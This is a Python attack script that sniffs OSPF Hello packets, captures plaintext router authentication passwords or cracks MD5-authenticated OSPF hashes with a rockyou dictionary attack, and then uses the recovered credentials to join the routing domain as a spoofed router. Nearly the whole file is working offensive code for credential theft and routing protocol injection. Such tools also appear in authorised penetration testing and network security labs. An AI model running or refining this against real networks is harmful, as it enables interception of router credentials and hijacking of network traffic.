import hashlib
import secrets
import typing
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello
from scapy.layers.inet import IP
from scapy.all import get_if_hwaddr, get_if_addr, sniff
import argparse
from helper.helper import (
        OSPFSession,
        OSPFConfig,
        OSPFAuthType,
        LOG,
        )


# FALLBACK if dict param not specified - easy to modify
ROCKYOU = "/usr/share/wordlist/rockyou.txt"

def crack_password(ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
    """
    OSPF Authtype 2 - Hashed PW cracker

    Currently only supports MD5 Hash Cracking

    OSPF Uses a specific MD5 hashing format

    How it works:
        1.  Clears chksum bit in OSPF Header - set to 0
        2.  Enforces a strict 16 byte long Key by padding NULL bytes to the end of the key if the key length is less than 16 bytes
            Otherwise, uses the first 16 bytes of the password as the Key
        3.  Concatenates the actual OSPF Packet (Header + Payload) with formatted Key
        4.  Calculates MD5 hash from this buffer and appends it to the end of the entire packet

    How we crack the hash:
        1.  Extract the hash from the packet - last 16 bytes
        2.  Extract OSPF Packet (Header + Payload) from the packet (Start of OSPF Header to End of packet - 16 bytes)
        3.  Run a dictionary attack hashing each password by following the hashing method above
        4.  Compare each hash digest against the extracted hash to get the password
    """

    # Theoretically chksum should alr be 0 but jic
    if getattr(ospf_pkt, "chksum", None) != 0:
        setattr(ospf_pkt, "chksum", 0)

    raw_ospf_pkt = bytes(ospf_pkt)

    # Extract OSPF MD5 hash located at end of OSPF packet (after OSPF header + payload)
    extracted_hash = raw_ospf_pkt[-16:]
    LOG.info("[!] Extracted hash %s", extracted_hash.hex())

    # Extract actual OSPF packet
    actual_ospf_pkt = raw_ospf_pkt[:-16]

    # Iterate and try passwords from rockyou.txt
    try:
        with open(filename, "r", encoding='utf-8') as file:
            for pw in file:
                print(f"Trying {pw}", end="\r")
                # Format key to exactly 16 bytes
                pw_bytes = pw.strip().encode('utf-8')
                padded_key = pw_bytes + b'\x00' * (16 - len(pw_bytes)) if len(pw_bytes) < 16 else pw_bytes[:16]

                # Concatenate actual ospf pkt and padded key
                buffer = actual_ospf_pkt + padded_key

                # Calculate hash
                generated_hash = hashlib.md5(buffer).digest()

                if generated_hash == extracted_hash:
                    # Match
                    LOG.critical("[!] Found Password: %s", pw)
                    return pw 
        # Password Cracking Failed
        LOG.fatal("[!] Failed to crack password. Hash: %s", extracted_hash)
        return "" 

    except FileNotFoundError:
        LOG.error("[!] %s file not found.", filename)
    except PermissionError:
        LOG.error("[!] No permission to open %s", filename)
    except Exception as e:
        LOG.error(f"[!] crack_password - Unknown error: {e}")

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("int", help="Network Interface Card to bind to (e.g. eth0)")
    parser.add_argument("router_id", help="Logical OSPF Router ID to assume (e.g. 10.10.10.10)")
    parser.add_argument("--dict", default=ROCKYOU, help="Path to dictionary file for MD5 hash cracking")

    args = parser.parse_args()
    LOG.info("[*] Initializing OSPF Injector...")
    
    # Dynamically Retrieve OSPF fields
    src_ip = get_if_addr(args.int)
    src_mac = get_if_hwaddr(args.int)

    # TODO: Double check if any other details need to be dynamically extracted from here
    extract_details = {
            "area": None,

            # Authentication fields
            "authtype": None,
            "keyid": None,
            "authdatalen": None,
            "auth_seq": None,
            "password": None,

            "mask": None,
            "hello_interval": None,
            "dead_interval": None,
            }

    def capture_ospf_details(pkt) -> bool:
        """Dynamically extract wanted values from sniffed OSPF packet"""
        if IP not in pkt or OSPF_Hdr not in pkt or OSPF_Hello not in pkt:
            return False

        # Drop own sniffed packets
        if pkt[IP].src == src_ip:
            return False

        # Drop own OSPF packets
        if str(pkt[OSPF_Hdr].src) == args.router_id:
            return False

        LOG.info("Captured OSPF Packet from %s", pkt[IP].src)

        ospf_packets = pkt[OSPF_Hdr]
        hello = pkt[OSPF_Hello]

        # Default values based on OSPF_Hello class
        extract_details["area"] = str(ospf_packets.area)
        extract_details["authtype"] = int(ospf_packets.authtype)
        extract_details["mask"] = str(hello.mask)
        extract_details["hello_interval"] = int(hello.hellointerval)
        extract_details["dead_interval"] = int(hello.deadinterval)

        if extract_details.get("authtype") == OSPFAuthType.CRYPTO:
            # Step 1. Extract keyID, authdatalen, and seq numbers
            # Step 2. Extract actual authdata (last 16 bytes of entire packet)
            # Step 3. Run cracker function to extract password (to lock or to not lock, that is the question)
            # Step 4. Fill self.config.plaintext_pw with cracked value 
            # Step 5. update _send_ospf func with corresponding details
            extract_details["keyid"] = ospf_packets.keyid
            extract_details["authdatalen"] = ospf_packets.authdatalen

            if not hasattr(ospf_packets, "seq"):
                extract_details["auth_seq"] = secrets.randbelow(0xFFFFFFFF - 1) + 1
            else:
                extract_details["auth_seq"] = (getattr(ospf_packets, "seq", 0) + 1) & 0xFFFFFFFF


        # NOTE: CURRENTLY CRACKS PASSWORD FIRST BEFORE COMMENCING OSPF ADJACENCY
        # DECIDE IF WE WANT TO USE THREADS TO RUN CRACKER IN THE BACKGROUND ASYNCRHONOUSLY
        # WILL REQUIRE CRACKIGN FUNCTION TO BE MOVED INTO OSPFSESSION AS WE CANNOT INITIALIZE OSPF SESSION THEN CRACK PASSWORD
        # Impt: Extract password/authdata and perform hash cracking first
        if extract_details["authtype"] == OSPFAuthType.PLAINTEXT:
            # Extract plaintext pw directly
            extract_details["password"] = ospf_packets.authdata
        elif extract_details["authtype"] == OSPFAuthType.CRYPTO:
            extract_details["password"] = crack_password(ospf_packets, args.dict)

        # self.config.plaintext_pw = self.crack_password(ospf, self.dictpath)

        if not extract_details.get("password"):
            exit(1)

        return True

    sniff(iface=args.int, filter="ip proto 89", stop_filter=capture_ospf_details, timeout=15)

    # Hard checker for None values
    missing = [key for key in extract_details.keys() if key is None]

    if missing:
        raise RuntimeError(
                f"No usable OSPF Hello captured on {args.int}"
                f"Missing: {missing}"
                )

    # initialise config
    config = OSPFConfig(
            iface=args.int,
            router_id=args.router_id,
            mask=typing.cast(str, extract_details.get("mask")),
            int_ip=src_ip,
            area=typing.cast(str, extract_details.get("area")),

            # Authentication fields
            authtype=typing.cast(int, extract_details.get("authtype")),
            plaintext_pw=typing.cast(str, extract_details.get("password")),
            key_id=typing.cast(int, extract_details.get("keyid")),
            authdata_len=typing.cast(int, extract_details.get("authdatalen")),
            authseq=typing.cast(int, extract_details.get("auth_seq")),

            hello_interval=typing.cast(int, extract_details.get("hello_interval")),
            dead_interval=typing.cast(int, extract_details.get("dead_interval")),
            )

    session = OSPFSession(config, src_ip, src_mac, args.dict)

    try:
        session.run()
    except KeyboardInterrupt:
        session.running = False
        LOG.info("SPOOFER STOPPED")


if __name__ == "__main__":
    main()
